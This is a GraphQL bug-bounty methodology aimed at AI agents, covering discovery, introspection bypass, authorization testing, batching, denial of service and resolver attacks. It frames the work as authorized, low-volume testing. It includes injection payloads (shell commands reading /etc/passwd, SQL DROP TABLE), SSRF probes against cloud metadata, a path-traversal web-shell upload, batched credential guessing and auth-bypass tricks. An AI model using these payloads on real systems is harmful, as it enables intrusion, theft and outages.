---
technology: GraphQL
kind: bug-bounty-methodology
audience: ai-agent
version: 0.3
last-refresh: "2026-11-19"
source: "rewritten from HackTricks (network-services-pentesting/pentesting-web/graphql.md), CC BY-NC 4.0, accessed 2026-11-12; supplement: six2dez/pentest-book (enumeration/web/graphql-deep.md, no license — rewritten with attribution), accessed 2026-11-13; supplement 2: KathanP19/HowToHunt (GraphQL/), GPL-3.0, accessed 2026-11-13; supplement 3 (2026-11-19): introspection surface-mining / directive-authz / DoS-as-report / CTF / reporting expansion, model-drafted (claude-opus-4-8), CVEs verified against primary advisories"
provenance: "hybrid: corpus-grounded (1 ledger rows, internal coverage ledger) + HackTricks enrichment 2026-11-13 + supplement 3 primary-advisory-verified expansion 2026-11-19; credit in source line"
---

Companion page: [[graphql|GraphQL overview]] — the human introduction. Tool notes live in the separate tools vault; Appendix A maps this methodology onto them by name.

---

# GraphQL Bug Bounty Methodology

**In scope:** any HTTP service speaking GraphQL — Apollo Server/graphql-js, graphql-java (Spring Boot, Netflix DGS), GraphQL Ruby, Graphene/Strawberry/Ariadne, HotChocolate, async-graphql, WPGraphQL, and Apollo Federation routers/subgraphs.

**Rules of engagement:** everything here is single-request, low-volume, evidence-oriented. DoS probes (Phase 6) and anything touching other users' data require explicit program authorization; capture request+response pairs for every claim before writing a report.

**The one-sentence model:** the spec ships zero auth and zero limits, every field is hand-written resolver code, and everything crosses one POST — so hunt per-field authorization gaps, schema-driven over-exposure, and work-amplification inside single requests.

### Where the money is (triage priority)

| # | Class | Shape | Typical severity |
|---|---|---|---|
| 1 | BOLA through resolvers | Root field takes an ID; resolver never checks ownership | High–Critical |
| 2 | Cross-account mutation | `updateProfile(username: victim, ...)` or admin mutation reachable by normal user | Critical |
| 3 | Field over-exposure | Schema fields never shown in REST/UI return secrets | Medium–High |
| 4 | Injection into resolvers | Search/filter args passed to SQL/NoSQL unsanitized | High |
| 5 | Batch/alias rate-limit bypass | N credentials or codes checked per 1 HTTP request | Medium–High |
| 6 | Auth bypass via operation chaining | Server validates `operationName`, executes whole document | High |
| 7 | Federation subgraph exposure | Public `_service { sdl }` / `_entities` skipping router authz | High |
| 8 | CSRF via form/multipart/GET | State change without preflight or token | Medium |
| 9 | DoS: depth/alias/directive/fragments | No complexity limits, or engine CVE | Medium |
| 10 | Introspection + IDE disclosure | Enabled by default; enabler, rarely a bounty alone | Info–Low |

---

## Phase 0 — Find and fingerprint the endpoint

### 0.1 Discovery

Content-discovery scans should carry the standard GraphQL paths: `/graphql`, `/graphiql`, `/graphql.php`, `/graphql/console`, `/api`, `/api/graphql`, `/graphql/api`, `/graphql/graphql` — plus versioned variants (`/v1/graphql`, `/v2/graphql`) and IDE paths (`/playground`, `/altair`, `/console`). The Escape Technologies graphql-wordlist repo (github.com/Escape-Technologies/graphql-wordlist) is purpose-built for this; run it with ffuf:

```bash
ffuf -w graphql-wordlist/endpoints.txt \
     -u https://example.com/FUZZ \
     -mc all -fc 404 -ac
```

Also grep the JS bundles: frontend code embeds the endpoint path and often full prebuilt query documents (`Sources → Search all files`, search `query` and `mutation`).

### 0.2 Confirm with a universal query

`__typename` is meta and always resolvable — the cheapest liveness probe there is:

```bash
curl -s -X POST https://example.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{__typename}"}'
# -> {"data":{"__typename":"Query"}}   = confirmed GraphQL
```

Probe transports beyond POST+JSON: `GET` with `?query=` (queries only — see Phase 4 for mutations-over-GET), and `POST` as `application/x-www-form-urlencoded` (`query=%7B__typename%7D`). Both matter later as introspection-bypass and CSRF channels.

### 0.3 Error shapes are free intelligence

```bash
for q in '{__schema}' '{}' '{thisdefinitelydoesnotexist}'; do
  curl -s -G 'https://example.com/graphql' --data-urlencode "query=$q"; echo; done
```

Read what comes back: stack traces, library names, `Did you mean '...'` suggestions — each names real fields. Error text also fingerprints the engine: send `query @deprecated { __typename }` and diff the rejection message — Apollo answers `Directive "@deprecated" may not be used on QUERY.`, GraphQL Ruby says `'@deprecated' can't be applied to queries`. graphw00f automates engine+version fingerprinting from signatures like these; InQL v6.1+ ships the same idea inside Burp. Once the engine is known, check it against the GraphQL Threat Matrix (github.com/nicholasaleks/graphql-threat-matrix) and the CVE list in Phase 6.

### 0.4 IDE check

Hit `/graphiql`, `/graphql/graphiql`, `/playground` directly; some deployments serve the IDE on the endpoint itself for GET — an open GraphiQL is interactive schema access (and usually proves CORS is broad).

---

## Phase 1 — Introspection mining (or reconstruction)

### 1.1 If introspection is on

Start small, then go deep — argument names and types are what make queries executable:

```bash
# Type + field names
curl -s -G 'https://example.com/graphql' \
  --data-urlencode 'query={__schema{types{name,fields{name}}}}'

# Everything needed to build runnable operations: fields, args, arg types
curl -s -G 'https://example.com/graphql' \
  --data-urlencode 'query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name,kind}}}}}}}'
```

For the full dump, use the canonical `IntrospectionQuery` document (the one GraphiQL sends, with `includeDeprecated: true`); if the server rejects it, remove the `onOperation`/`onFragment`/`onField` leaves from the `directives` block — many validators choke on those. Save the JSON; visualize it with GraphQL Voyager when the graph is too big to read as text.

### 1.2 What to extract (the checklist that pays)

- **`queryType` root fields** — the only objects you can query directly; everything else is nested under them.
- **`mutationType` root fields** — the write surface; classify admin-sounding verbs for Phase 4.
- **Argument names + types on every field** — `uid: Int` invites enumeration; note ID formats (sequential int, UUID, base64 global ID) for Phase 2.
- **Field names matching secret patterns** — `password`, `token`, `secret`, `apiKey`, `hash`, `otp`, `ssn`, `mfa` — grep the saved dump: `grep -oiE '"name":"(password|pass|token|secret|api_?key|.*hash|otp|ssn)[^"]*"' schema.json`
- **Deprecated fields** (`includeDeprecated: true`) — unmaintained = unreviewed.
- **The `Node` interface and `node(id:)`** — a second route to every object (Phase 2.4).
- **`scalar Upload`, `upload*`/`import*` mutations, and `subscriptionType`** — multipart abuse (Phase 5.3) and a WebSocket surface (`wss://example.com/graphql`, subprotocol `graphql-ws`).
- **`_service` / `_entities`** — Federation subgraph fields (Phase 4).
- **Custom directives** — ammunition for Phase 6 directive overload.

### 1.3 Turning the schema into data

Only root fields are directly callable. If a root field returns a scalar (`{ hiddenFlags }`), ask for it bare; if it takes arguments, read the arg types from 1.2 and drive them: `query={user(uid:1){user,password}}`, escalating `uid` over small integers. Probing a nonexistent field (`{user(uid:1){nope}}`) makes the validator enumerate what *does* exist on that type. If any search field accepts a String, try the empty string — matching nothing is hard, and `searchPerson(name: "")` style calls frequently return the entire table.

### 1.4 If introspection is off — reconstruct

- **Regex-bypass the block first.** Naive defenses match the literal `__schema`; GraphQL's lexer ignores whitespace and commas inside the document, so inject one after the keyword:

```bash
curl -s -X POST https://example.com/graphql -H 'Content-Type: application/json' \
  -d '{"query":"query{__schema\n{queryType{name}}}"}'
```

  Try space, newline, and comma variants; retry the same queries via `GET` and via form-urlencoded POST — the filter often guards only JSON POST.
- **Clairvoyance** (github.com/nikitastupin/clairvoyance) rebuilds the schema from validation errors and known-schema databases: `clairvoyance -u https://example.com/graphql -o schema.json`.
- **InQL v6.1+ schema bruteforcer** batches candidate names against each type and harvests error signal: `Field 'x' not found on type 'Y'` confirms the parent type, `Argument 'a' is required` leaks an argument's existence, `Did you mean 'openPR'?` hands back validated names, and wrong-typed values (`"str"` where Int belongs) leak full type signatures like `[Episode!]`. It recurses into every new type it finds. Feed it candidates: mix the Escape graphql-wordlist entity names with app-specific guesses, and generate more with hashcat's stdout mask mode, e.g. `hashcat --stdout -a 3 --increment user?l?l?l | sort -u >> candidates.txt` — tune batch size and throttling per target.
- **Passive sources:** the GraphQuail Burp extension builds a schema from every query that passes through the proxy. And mine the frontend bundles — persisted/compiled queries in JS name operations, fields, and variables the API actually uses (DevTools Sources search: `file:* mutation`, `file:* query`).
- **Persisted queries / APQ are not a safelist.** Send a hash-only request (`extensions.persistedQuery.sha256Hash`); on `PersistedQueryNotFound`, resend with the full `query` string appended — Apollo-style servers typically execute and cache it. If only APQ was enabled as a "defense", arbitrary documents still get through.

---

## Phase 2 — BOLA through resolvers (two-account method)

**Why it works:** authentication is usually a global middleware (a token check on `/graphql`); authorization would have to live inside each resolver — and one forgotten field is a finding.

**Method — strict two-account discipline:**

1. From the Phase 1 dump, list every root field (query *and* mutation) whose args look like object references: `id`, `uuid`, `userId`, `orderId`, `email`, `token`, `slug`.
2. Provision two accounts you control: **A** (attacker) and **B** (target). Record B's object IDs — from B's own traffic, from objects B creates, or from IDs visible to A (leaked references are themselves evidence).
3. Authenticated as A, request B's objects. Evidence pair = A's request (A's cookie/token in headers) + response body containing B's private fields.
4. Repeat the interesting ones **unauthenticated** and with a **downgraded role** if the app has roles — authn sometimes gates a field that authz should have.
5. Test the *write* side too (`update`/`delete` on B's objects as A) — a cross-account write is the Critical tier, and the profile-edit variant is the account-takeover shape: `mutation updateProfile($username: String!, $data: ...)` with B's identifier in `username` and your data in `data`.
6. Escalate cautiously: sequential integer IDs (`uid:1`, `uid:2`) permit small, provable enumeration samples (3–5 IDs is a report; thousands is abuse); for UUID/opaque IDs, test only captured or leaked values.

### 2.4 The `node(id:)` second route

Relay-compatible schemas expose `node(id: ID!)` refetching any `Node` object — a *second resolver* to the same data, written separately, checked separately. Take an object's `id` from a response your account can see, then compare both routes under the weaker principal:

```graphql
query Direct { book(id: "7") { id title } }
query ViaNode { node(id: "7") { id ... on Book { title } } }
```

If the type-specific query denies and `node` returns the object, the alternate resolver misses the check. A working `node` field alone is expected behavior — the gap is the differential.

---

## Phase 3 — Field-level over-exposure vs the REST schema

GraphQL endpoints are very often **mounted alongside REST on the same origin** (`/api/users` and `/api/graphql` on one service) — the graph layer was added later and its types usually expose a *superset* of the fields the REST serializers return. When that REST side is a FastAPI app, [[fastapi-bug-bounty]] covers how to pull its full OpenAPI contract; here you only need its output as the baseline.

**Method:**

1. For a resource (say `User`), collect the reference exposure: the REST response body / OpenAPI schema for `GET /api/users/7`.
2. Request the same object through GraphQL asking for **every field** introspection offers on that type — including deprecated ones.
3. Diff. Fields present in the schema but absent from every REST serializer and UI screen — `passwordHash`, `apiKey`, `token`, `tenantId`, internal flags, soft-delete markers — are over-exposure findings. Severity tracks the data class.
4. Without introspection, probe blind: the validator's "Cannot query field X on type Y" / "Did you mean" errors (Phase 0.3) confirm or deny individual field names one request at a time. Root cause of the whole class: exposure is decided per-field by whoever designed the type, not by a serializer the rest of the API reviews.

---

## Phase 4 — Mutation and authorization gaps

1. **Enumerate every `Mutation` root field** from introspection; sort into user-facing vs privileged (`deleteUser`, `setRole`, `makeAdmin`, `impersonate`, `invite`, `export*`, `bulk*`), then fire each privileged one as: no token, normal user, other-role user. Expected: authz error or null; got a payload — evidence triple (identity, request, effect).
2. **Operation chaining / `operationName` confusion.** Some servers validate or route on the declared `operationName` but execute every root field in the document. Take a benign operation (`forgotPassword`) and append the mutation you want (`register`, `updateEmail`) to the same document — if the appended field executes under the benign operation's rules, the authz decision was made about the *name*, not the work.
3. **Mutations over GET.** GraphQL-over-HTTP requires servers to *reject* mutations sent as GET `?query=`; some don't. Verify with an observable, reversible side effect — record start state, run via POST to prove the mutation works, restore, then run via GET and check for a *fresh* effect (HTTP 200 alone proves nothing). If it fires, a single link can drive the mutation cross-site. graphql-cop ships this as an automated check.
4. **Federation: query the subgraphs directly.** Federation subgraphs auto-add `_service { sdl }` (full subgraph SDL — spec'd to keep working even when introspection is "disabled") and `_entities(representations: [...])`. The router is commonly the enforcement point (`@authenticated`, `@requiresScopes`, safelists); a directly reachable subgraph skips it. Test: send `{"query":"query{_service{sdl}}"}` to every GraphQL host you can find (other ports, internal-looking hostnames such as `198.51.100.23:4000`, staging). If SDL returns, find `@key` types and mimic the router:

```graphql
query { _entities(representations: [{__typename: "User", id: "1"}]) { ... on User { id email } } }
```

The finding is protected entity data returned without the router's checks. Bonus: subgraph responses often carry `extensions` tracing leaking internal service names and timings. (A public endpoint answering `_service` at all is almost certainly a subgraph, not the router.)

---

## Phase 5 — Batching, aliasing, and rate-limit bypass

The theme: protections count HTTP requests; GraphQL counts operations. They disagree by design.

### 5.1 Aliases — N identical fields in one document

```graphql
query codes {
  c0: isValidDiscount(code: 0) { valid }
  c1: isValidDiscount(code: 1) { valid }
  c2: isValidDiscount(code: 2) { valid }
}
```

Aliases exist so one document can fetch the same field repeatedly; a request-rate limiter sees one POST. Any brute-forceable surface — discount codes, OTPs, invite codes, password-reset tokens — is a candidate. InQL's *Attacker* mode automates aliased batch attacks.

### 5.2 Array batching — N whole operations in one request

Many servers accept a JSON **array** of operation objects. The classic — three credential pairs in one POST below; the correct one's response carries the session token, the rest return auth errors (batchql from github.com/assetnote/batchql detects and audits this):

```bash
curl -s -X POST https://example.com/graphql -H 'Content-Type: application/json' \
  -d '[{"query":"mutation{login(u:\"a@example.com\",p:\"x\"){token}}"},
       {"query":"mutation{login(u:\"b@example.com\",p:\"y\"){token}}"},
       {"query":"mutation{login(u:\"c@example.com\",p:\"z\"){token}}"}]'
```

### 5.3 CSRF-adjacent channels

- **form-urlencoded POST** is a *simple request* — no CORS preflight, so a cross-site page can drive state-changing mutations using the victim's cookies; many APIs accept it beside JSON. Same for **multipart** uploads (`scalar Upload`).
- **Multipart abuse:** reuse one file variable in several resolver arguments (double-read/stream-exhaustion), and send orphan file parts the parser may buffer before checking the `map` references — watch response latency and temp-file growth:

```bash
curl -X POST https://example.com/graphql \
  -F 'operations={"query":"mutation($f: Upload!){a:uploadAvatar(file:$f){id} b:uploadAvatar(file:$f){id}}","variables":{"f":null}}' \
  -F 'map={"0":["variables.f"]}' \
  -F '0=@/tmp/poc.bin'
```

- Assess severity against the target's actual cookie policy — default `SameSite=Lax` cookies don't ride cross-site subresource POSTs; a CSRF report needs the browser conditions to line up.

---

## Phase 6 — Depth, complexity, and DoS

Run only under explicit authorization; single request, then measure — never flood.

- **Missing depth limit and repetition.** Self-referential types (`user → friends → user …`) multiply resolver work per level — build a deep nest programmatically and watch latency per added level; unbounded linear (or worse) growth = no depth limit. Likewise the same trivial field (`__typename`) repeated hundreds of times, aliased or verbatim, is resolved once per occurrence.
- **Directive overloading.** `__typename @include(if:true) @include(if:true) …` — duplicated directives expand in the parser/executor. Introspect `__schema{directives{name}}` and overload custom directives too. CVE-2024-47614: async-graphql < 7.0.10 crashed on exactly this (`limit_directives()` or ≥ 7.0.10 fixes).
- **Fragment tricks.** CVE-2024-40094: graphql-java (< 19.11, 20.x < 20.9, 21.x < 21.5) — recursive fragments (`fragment A on Query { ...B }` / `fragment B on Query { ...A }`) bypassed `MaxQueryDepth`/`MaxQueryComplexity` entirely. CVE-2025-32031: `@apollo/gateway` < 2.10.1 — exponentially reused fragments burn CPU in the *planner* before subgraphs are even called (signal: gateway latency spikes with near-zero subgraph traffic).
- **`@defer`/`@stream` amplification.** Incremental delivery emits one chunk per deferred field — thousands of tiny `@defer`red aliases inflate the response N+1×, slipping past body-size WAF rules that only look at the first chunk.
- **Engine CVE chain worth remembering:** WPGraphQL ≤ 1.14.5 `createMediaItem` accepted attacker URLs (`filePath: "http://198.51.100.7/x"`) → SSRF into file-write RCE.

graphql-cop automates the standard checks (alias overload, batching, directive and field duplication, mutation-over-GET). On defense, graphql-armor wraps depth/cost/directive limits — if a target runs it, Phase 6 is mostly closed; move on.

---

## Appendix A — Tool map

Tools live in the tools vault; this maps names to phases. GUI clients (GraphiQL, Altair) cover interactive exploration of a confirmed endpoint in Phases 0–1.

- **graphw00f** — Phase 0. Engine + version fingerprinting from response signatures.
- **inql** (Doyensec; Burp extension, also standalone Python) — Phases 0/1/3/5. Schema extraction and query generation, engine fingerprinter, error-based schema bruteforcer with wordlists, automatic variable generation (sane defaults per type for instant Repeater/Intruder pivots), Attacker batch mode for aliased operations; its standalone/CLI query-generation line continues as GQLSpection.
- **clairvoyance** — Phase 1. Schema reconstruction from error hints when introspection is disabled.
- **GraphQuail** (Burp extension) — Phase 1. Passively builds the schema from observed traffic; fakes introspection responses.
- **GraphQL Voyager** — Phase 1. Interactive graph visualization of a dumped schema.
- **graphql-cop** — Phases 0/4/6. Automated misconfiguration checks (introspection, mutation-over-GET, alias/batch/directive/field DoS probes).
- **batchql** — Phase 5. Batching support detection and audit.
- **GraphCrawler** — Phases 1–2. Schema grabbing, sensitive-data search, authorization testing, schema brute force.
- **graphql-path-enum** — Phases 2–3. Lists every path through the schema that reaches a given type (find your route to `User`/`Secret`).
- **GraphQLmap** — Phases 2/4. Interactive CLI client with injection helpers.
- **hashcat** — Phase 1. Wordlist generation via stdout mode (`--stdout -a 3` masks, or `-a 0 -r` rules over seeds) feeding InQL's schema bruteforcer.
- **ffuf** — Phase 0. Endpoint discovery with GraphQL path wordlists.

## Appendix B — Command quick reference

```bash
U=https://example.com/graphql

# liveness (universal query)
curl -s -X POST $U -H 'Content-Type: application/json' -d '{"query":"{__typename}"}'

# introspection: names, then full shape
curl -s -G $U --data-urlencode 'query={__schema{types{name,fields{name}}}}'
curl -s -G $U --data-urlencode 'query={__schema{types{name,fields{name,args{name,type{name,kind,ofType{name,kind}}}}}}}'

# introspection-block regex bypass (space / newline / comma after __schema)
curl -s -X POST $U -H 'Content-Type: application/json' \
  -d '{"query":"query{__schema\n{queryType{name}}}"}'

curl -s -G $U --data-urlencode 'query={thisdefinitelydoesnotexist}'

# engine fingerprint (error text) — Apollo vs GraphQL Ruby
curl -s -X POST $U -H 'Content-Type: application/json' \
  -d '{"query":"query @deprecated { __typename }"}'

# mutations over GET (verify a FRESH side effect; restore state after)
curl -s -G $U --data-urlencode 'query=mutation { updateTestRecord(id: "1", value: "probe") { id } }'

curl -s -X POST $U -H 'Content-Type: application/json' \
  -d '[{"query":"{__typename}"},{"query":"{__typename}"}]'

# federation: subgraph SDL + entity fetch (bypasses router-side authz)
curl -s -X POST $U -H 'Content-Type: application/json' -d '{"query":"query{_service{sdl}}"}'
curl -s -X POST $U -H 'Content-Type: application/json' \
  -d '{"query":"query{_entities(representations:[{__typename:\"User\",id:\"1\"}]){... on User{id email}}}"}'

# tooling
graphw00f -t $U                          # engine fingerprint
python3 graphql-cop.py -t $U             # misconfig suite
clairvoyance -u $U -o schema.json        # schema from errors
python3 inql.py -t $U -o out.json        # schema + generated queries
hashcat --stdout -a 3 --increment user?l?l?l | sort -u > candidates.txt  # wordlist gen

ffuf -w graphql-wordlist/endpoints.txt -u https://example.com/FUZZ -mc all -fc 404 -ac
```

## Supplement (2026-11-13) — resolver injection, SSRF fields, and the deltas from six2dez/pentest-book

Rewritten from six2dez/pentest-book (`enumeration/web/graphql-deep.md`, no license — rewritten with attribution), accessed 2026-11-13. Diff-first: discovery, introspection mining/bypass, BOLA, over-exposure, mutation authz, batching/aliases, DoS and the tool map were already covered above; the deltas follow. (Source note: its InQL link points at a dead `doyensec/inern` repo — the real project is `doyensec/inql`.)

**S1. Resolver injection — the class triage row #4 promised.** String arguments cross from the GraphQL layer into whatever the resolver speaks; treat each argument TYPE as a different injection dialect:

```graphql
# SQL — string args, filters, and sort fields:
{ user(name: "admin' OR '1'='1") { id email } }
{ users(filter: { name_contains: "' OR 1=1--" }) { id } }
{ users(orderBy: "name; DROP TABLE users--") { id } }
# NoSQL — object-y filters are where MongoDB operators land:
{ user(name: "{\"$gt\": \"\"}") { id email } }        # $gt "" matches everything
{ users(filter: { name_regex: ".*" }) { email } }      # regex DoS/enumeration
# Shell — export/report verbs whose args reach format strings:
mutation { exportData(format: "csv; cat /etc/passwd") { url } }
mutation { generateReport(type: "pdf`whoami`") { status } }
```

Escalation rule: a quoting error in ONE resolver rarely stays alone — the same argument names (`filter`, `orderBy`, `search`) tend to be handled by shared dataloader code across types.

**S2. URL-accepting fields are SSRF endpoints.** Beyond the WPGraphQL CVE in Phase 6, any field that fetches by URL (`importUrl`, `webhook`, `avatar`, `import*`) is server-side request forgery with a GraphQL face: probe the cloud metadata IP (`http://169.254.169.254/latest/meta-data/`), `file:///etc/passwd` where the client follows schemes, and internal-only service names (`http://internal-service:8080/admin`) that resolve from the resolver's network position but not yours. The mutation response usually echoes status or content — a built-in Collaborator.

**S3. Two more introspection/WAF filter dodges.** `__type(name: "User") { fields { name } }` — single-type introspection often escapes naive filters written only against the literal `__schema`. And request-shape variety: `Content-Type: application/graphql`, `text/plain` bodies, GET-with-query, heavy URL encoding, and restructuring the document through fragments (`...UserFields`) each evade filters keyed on the canonical POST-JSON shape.

**S4. Multipart upload, traversal flavor.** Phase 5.3's multipart abuse covers DoS; the sibling bug is the FILENAME: `-F '0=@shell.php;filename=../../../var/www/html/shell.php'` — when the resolver writes uploads by name, path traversal in the multipart part decides where it lands. Check also which extension the served copy keeps.

**S5. Subscriptions — the second transport.** A `subscriptionType` in the schema means a WebSocket endpoint (`wss://example.com/graphql`). Two protocol generations to try: legacy Apollo `graphql-ws` subprotocol (`connection_init` then `start` messages) and the modern `graphql-transport-ws` (`connection_init` then `subscribe`). Fire sensitive-event subscriptions unauthenticated and with a low-priv token — auth checks on the WS handshake are frequently weaker than on the HTTP POST, and event payloads (user created, message sent) leak other users' data in real time.

**S6. Tool deltas.** CrackQL (nicholasaleks) automates batched brute-force — give it a template query, a username wordlist, and a password list, and it compiles the alias-batched documents Phase 5 describes. GraphQL Raider (Burp extension) automates query mutation and replay. A nuclei `graphql-detect` template turns endpoint discovery into one command during external scoping.

## Supplement 2 (2026-11-13) — rewritten from KathanP19/HowToHunt (GraphQL/), GPL-3.0, accessed 2026-11-13

Diff-first: this source is a link-and-tool round-up whose substance — engine fingerprinting (graphw00f), InQL, Voyager, JS-bundle operation mining, introspection workflow — is already covered above; one tool delta survives.

**S1. Graphicator — from schema to harvested responses.** Where InQL generates queries for you to fire one by one, Graphicator (github.com/cybervelia/graphicator) closes the loop on an open-introspection endpoint: it walks the introspection document, reconstructs every supported query, executes each against the target, and writes all non-error responses to disk (`--target` for a single endpoint or `--file` for a list; ships a Docker image). Against an endpoint with introspection open and no per-operation authorization, that is a one-command mass-harvest — read its output as the Phase 2 hit-list of everything readable.

## Supplement 3 (2026-11-19) — surface mining, directive-authz, DoS-as-report, CTF patterns, and reporting

*Model-drafted (claude-opus-4-8); every CVE re-verified against primary advisories (NVD/GHSA) on 2026-11-19. Diff-first: discovery, introspection on/off, BOLA, over-exposure, mutation authz, batching/aliases, resolver injection, SSRF, subscriptions, and the tool map are already covered above. This supplement deepens introspection surface-mining, adds the alias/batch low-volume discipline, reframes depth/complexity as a report-not-test finding with fresh CVEs, adds the directive-authz class absent above, systematizes field-suggestion mining, pins expected tool outputs, and adds the CTF-notes and reporting blocks the earlier revisions never carried.*

### T1. Introspection surface mining with `get_introspection_query` (extends Phase 1)

Phase 1.1 points at "the canonical IntrospectionQuery document the one GraphiQL sends." Generate it deterministically instead of pasting — `graphql-core` (Python) and `graphql` (JS) both ship the builder, and the flags decide how much leaks back:

```python
# graphql-core >= 3.x — emit the exact document the server's own validator expects
from graphql import get_introspection_query
import json, httpx

q = get_introspection_query(
    descriptions=True,            # pulls developer-written field/arg docs — often leak intent, ticket IDs, PII notes
    directive_is_repeatable=True, # surfaces custom directives you can overload (T4, Phase 6)
    schema_description=True,
    input_value_deprecation=True, # deprecated INPUT args = unmaintained write paths
)
r = httpx.post("https://example.com/graphql",
               json={"query": q},
               headers={"Authorization": "Bearer $TOKEN_A"})
schema = r.json()
json.dump(schema, open("schema.A.json", "w"))
# -> full {"data":{"__schema":{...}}}; feed to Voyager, inql, or graphql-path-enum
```

If the server answers `get_introspection_query(input_value_deprecation=True)` with `Unknown argument "includeDeprecated" on field "__Field.args"`, the engine predates June-2021 graphql-js — regenerate with `input_value_deprecation=False`. That error is itself a version tell for graphw00f-style fingerprinting.

**Field-level authz diffing — the systematic form of Phase 3.** Over-exposure (Phase 3) and resolver BOLA (Phase 2) share a root cause — *authorization is decided per field by whoever wrote the resolver* — so the highest-signal pass is a per-principal visibility matrix, not ad-hoc field requests. Dump the schema once per principal and diff:

```bash
# three principals: unauth, low-priv A, (if the program allows) elevated
for P in anon A ADMIN; do
  curl -s -X POST https://example.com/graphql -H 'Content-Type: application/json' \
       ${TOKENS[$P]:+-H "Authorization: Bearer ${TOKENS[$P]}"} \
       -d @introspection.json | jq -S '.data.__schema' > schema.$P.json
done
diff <(jq -r '..|.name?//empty' schema.anon.json | sort -u) \
     <(jq -r '..|.name?//empty' schema.A.json    | sort -u)
```

A type/field that appears in the authenticated dump but not the anon one tells you where the auth boundary is drawn *in the schema*; the finding is any field that the schema exposes to a principal who should not resolve it. Then confirm per-field at the data layer — ask one principal for a single sensitive field (`{ user(id:"7"){ passwordHash } }`) and record 200+value versus `null`+`errors[].message`. The diff narrows thousands of fields to the handful worth a two-account test; it does not replace the test (schema visibility ≠ resolve-time authz — a field can be introspectable yet return `null` for the wrong caller, and vice versa).

### T2. Alias and batch abuse — the low-volume discipline (extends Phase 5)

Phase 5 establishes that aliases and array-batching bypass request-rate limits because "protections count HTTP requests; GraphQL counts operations." The discipline the earlier text leaves implicit: **in an authorized program you demonstrate the amplification, you do not exploit it.** A 10,000-alias credential-stuffing run is the finding working as the attacker intends — and a rules-of-engagement violation, a load event, and over-collection all at once.

The reportable pattern is a *capped* proof plus an arithmetic claim:

```graphql
# PROOF, not attack: 5 aliases, 5 known-wrong codes, one HTTP request
query capCheck {
  a: redeemCode(code: "TEST-0001") { ok }
  b: redeemCode(code: "TEST-0002") { ok }
  c: redeemCode(code: "TEST-0003") { ok }
  d: redeemCode(code: "TEST-0004") { ok }
  e: redeemCode(code: "TEST-0005") { ok }
}
```

Then establish the two facts that make it a rate-limit bypass without ever running the full attack:

1. **The per-request limiter does not count aliases.** Send the 5-alias document N times until the HTTP-level limiter trips (a handful of requests), and show that each *accepted* request processed 5 code-checks. If the single-request alias ceiling is, say, 100 and the HTTP limiter allows 20 req/min, the effective check rate is 2,000/min against a surface the developer rate-limited to 20 — state that as a computed figure, not an executed one.
2. **No GraphQL-aware cost control fires.** If the server runs graphql-armor / graphql-cost-analysis / Apollo operation limits, the capped document returns a `cost limit exceeded` / `max aliases` error — Phase 5 is closed, note it and move on (`[MaxAliasesRule] Aliases limit of 15 exceeded, found 5` style messages are the tell). Absence of that error under your capped probe *is* the evidence.

Same arithmetic for array batching (`[{...},{...}]`): send a batch of 3–5 real operations, confirm each executed (distinct per-element responses), and report the missing `max batch size` control. batchql's audit output (`Batch queries: SUPPORTED`, `Query batching limit: NONE DETECTED`) is the one-line corroboration; capture it verbatim. The number you put in the report is the single-request alias/batch ceiling you measured by bisection — the amplification factor — not a count of accounts you actually tried.

### T3. Depth / complexity DoS — a report-not-test finding (extends Phase 6)

Phase 6 already says "single request, then measure — never flood." Make the stance explicit, because resource-exhaustion is the one class where the responsible deliverable is *the absence of a control*, proven with a bounded probe, not a demonstrated outage:

- **One probe, then extrapolate.** Fire a single nested or alias-expanded document and record `time_total`. Step the depth/alias count a few times (e.g. 10 → 20 → 40) and plot latency. Super-linear growth with no `max depth`/`cost` rejection *is the finding* — you report "no depth limit; latency grew O(n²) across depths 10–40, extrapolates to worker exhaustion," you do not keep climbing until the worker dies.

```bash
for d in 10 20 40; do
  Q=$(python3 - "$d" <<'PY'
import sys; d=int(sys.argv[1])
print("{a"+ "{b"*d + "c" + "}"*d + "}")   # schema-specific: pick a self-referential edge
PY
)
  curl -s -o /dev/null -w "depth=$d %{http_code} %{time_total}s\n" \
    -X POST https://example.com/graphql -H 'Content-Type: application/json' \
    --data "$(jq -nc --arg q "$Q" '{query:$q}')"
done
# secure: a 'max depth exceeded' 400 at some d; finding: times climbing with every row 200
```

- **Prefer the CVE match over the live probe.** If Phase 0 fingerprinted the engine and version, a known advisory *is* a cleaner, lower-risk report than any latency graph — you cite the CVE, show the version, and recommend the upgrade, sending one validating request at most. The 2025 additions to the Phase 6 CVE set:

| Component | Versions | CVE | Bug (attacker view) | Fixed |
|---|---|---|---|---|
| apollo-compiler (Rust / apollo-rs) | < 1.27.0 | CVE-2025-31496 (CVSS 7.5) | Validation re-processes each named fragment per spread → deeply nested reused fragments cause exponential work during validation; a single small document stalls the server | 1.27.0 |
| apollo-router | < 1.61.2, 2.x < 2.1.1 | CVE-2025-32032 (GHSA-94hh-jmq8-2fgp, CWE-770) | Nested/reused named fragments bypass planner optimizations; the query planner enforces **no timeout**, so a few crafted queries exhaust the router thread pool — gateway dies while subgraph traffic stays near zero | 1.61.2 / 2.1.1 |
| graphql-java | < 19.11, 20.x < 20.9, 21.x < 21.5 | CVE-2024-40094 | Introspection queries not counted as ExecutableNormalizedFields → introspection-driven DoS; the fix adds `operationFieldCount` + introspection depth limits | 21.5 / 20.9 / 19.11 |
| graphql-js | < 16.8.1 (and 15.x < 15.9.0) | CVE-2023-26144 | `OverlappingFieldsCanBeMergedRule` lacked a size guard → a large query drives uncontrolled CPU; introspection-free amplification that needs no deep nesting | 16.8.1 |

The Apollo pair (CVE-2025-31496 / CVE-2025-32032) is the same **named-fragment re-expansion** primitive at two layers: the fragment-reuse DoS from Phase 6's CVE-2025-32031 note is now a whole family. Signal for all three: latency concentrated in *validation/planning*, before any resolver or subgraph runs. For graphql-java and graphql-js, the DoS is introspection- or merge-rule-driven, so even an introspection-disabled target is reachable if it still validates attacker documents (every target does).

### T4. Directive-based conditional authz (new class — extends Phases 3–4)

GraphQL's built-in `@skip(if:)` / `@include(if:)` and any custom schema directive are evaluated by hand-written code, and that code routinely checks the wrong AST nodes. Three distinct bugs, none covered above:

- **Auth directive applied to Field nodes only.** A server enforcing `@auth`/`@requiresScopes` by walking `Field` selections misses the *same field reached through an inline fragment or a named fragment spread*. Wrap the protected selection and the check never fires:

```graphql
# direct — guarded:                 # smuggled — guard walks Field nodes, not fragments:
query { secretReport { data } }     query { ... on Query { secretReport { data } } }
